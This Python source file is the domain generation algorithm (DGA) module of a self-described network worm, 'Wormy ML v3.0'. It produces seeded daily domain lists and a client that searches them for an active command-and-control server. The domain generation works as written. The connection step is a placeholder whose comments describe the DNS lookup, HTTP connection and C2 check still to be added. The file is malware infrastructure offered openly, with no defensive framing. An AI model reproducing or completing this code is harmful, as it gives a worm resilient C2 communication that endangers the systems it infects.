"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Domain Generation Algorithm (DGA)
Generates pseudo-random domains for C2 communication
"""


import datetime
import hashlib
from typing import List

from utils.logger import logger


class DomainGenerator:
    """
    DGA for resilient C2 communication
    Generates deterministic domains based on seed and date
    """

    def __init__(self, seed: str = "ml_worm_2024", tlds: List[str] = None):
        self.seed = seed
        self.tlds = tlds or [".com", ".net", ".org", ".info", ".biz"]

        logger.info(f"DGA initialized with seed: {seed[:10]}...")

    def generate_domains(self, date: datetime.date = None, count: int = 1000) -> List[str]:
        """
        Generate domains for a specific date

        Args:
            date: Date to generate domains for (default: today)
            count: Number of domains to generate

        Returns:
            List of domain names
        """
        if date is None:
            date = datetime.date.today()

        logger.info(f"Generating {count} domains for {date}")

        domains = []
        date_str = date.strftime("%Y%m%d")

        for i in range(count):
            # Create unique string for this domain
            unique_str = f"{self.seed}{date_str}{i}"

            # Generate hash
            hash_obj = hashlib.sha256(unique_str.encode())
            hash_hex = hash_obj.hexdigest()

            # Take first 12 characters for domain name
            domain_name = hash_hex[:12]

            # Select TLD based on hash
            tld_index = int(hash_hex[-2:], 16) % len(self.tlds)
            tld = self.tlds[tld_index]

            # Combine
            full_domain = f"{domain_name}{tld}"
            domains.append(full_domain)

        logger.debug(f"Generated {len(domains)} domains")
        return domains

    def get_current_domains(self, count: int = 10) -> List[str]:
        """Get domains for today"""
        return self.generate_domains(count=count)

    def get_fallback_domains(self, days_back: int = 7, count_per_day: int = 10) -> List[str]:
        """
        Get fallback domains from previous days

        Args:
            days_back: How many days back to generate
            count_per_day: Domains per day

        Returns:
            List of fallback domains
        """
        all_domains = []
        today = datetime.date.today()

        for i in range(days_back):
            date = today - datetime.timedelta(days=i)
            domains = self.generate_domains(date, count_per_day)
            all_domains.extend(domains)

        logger.info(f"Generated {len(all_domains)} fallback domains ({days_back} days)")
        return all_domains

    def verify_domain(self, domain: str, date: datetime.date = None) -> bool:
        """
        Verify if a domain is valid for a given date

        Args:
            domain: Domain to verify
            date: Date to check (default: today)

        Returns:
            True if domain is valid
        """
        if date is None:
            date = datetime.date.today()

        valid_domains = self.generate_domains(date, count=1000)
        return domain in valid_domains


class DGAClient:
    """
    DGA Client for C2 communication
    Tries generated domains until one responds
    """

    def __init__(self, seed: str = "ml_worm_2024"):
        self.dga = DomainGenerator(seed)
        self.active_domain = None

    def find_c2_server(self, max_attempts: int = 50) -> str:
        """
        Find active C2 server using DGA

        Args:
            max_attempts: Maximum domains to try

        Returns:
            Active C2 domain or None
        """
        logger.info("Searching for C2 server using DGA")

        # Get current domains
        domains = self.dga.get_current_domains(count=max_attempts)

        # Try each domain
        for domain in domains:
            if self._try_domain(domain):
                self.active_domain = domain
                logger.success(f"Found active C2: {domain}")
                return domain

        # Try fallback domains
        logger.warning("No current domains active, trying fallback")
        fallback_domains = self.dga.get_fallback_domains(days_back=3, count_per_day=20)

        for domain in fallback_domains:
            if self._try_domain(domain):
                self.active_domain = domain
                logger.success(f"Found active C2 (fallback): {domain}")
                return domain

        logger.error("No active C2 server found")
        return None

    def _try_domain(self, domain: str) -> bool:
        """Try to connect to a domain"""
        try:
            import socket

            # Try to resolve domain
            # In real implementation, would try to connect
            logger.debug(f"Trying domain: {domain}")

            # Simulate connection attempt
            # Real implementation would:
            # - DNS lookup
            # - HTTP/HTTPS connection
            # - Verify C2 response

            return False  # Placeholder

        except Exception as e:
            logger.debug(f"Domain {domain} failed: {e}")
            return False


if __name__ == "__main__":
    # Test DGA
    dga = DomainGenerator(seed="test_seed_123")

    print("=" * 60)
    print("DOMAIN GENERATION ALGORITHM TEST")
    print("=" * 60)

    # Generate domains for today
    today_domains = dga.get_current_domains(count=10)
    print(f"\nDomains for today ({datetime.date.today()}):")
    for i, domain in enumerate(today_domains, 1):
        print(f"  {i}. {domain}")

    # Generate domains for yesterday
    yesterday = datetime.date.today() - datetime.timedelta(days=1)
    yesterday_domains = dga.generate_domains(date=yesterday, count=5)
    print(f"\nDomains for yesterday ({yesterday}):")
    for i, domain in enumerate(yesterday_domains, 1):
        print(f"  {i}. {domain}")

    # Verify domain
    test_domain = today_domains[0]
    is_valid = dga.verify_domain(test_domain)
    print(f"\nVerification test:")
    print(f"  Domain: {test_domain}")
    print(f"  Valid: {is_valid}")

    print("=" * 60)
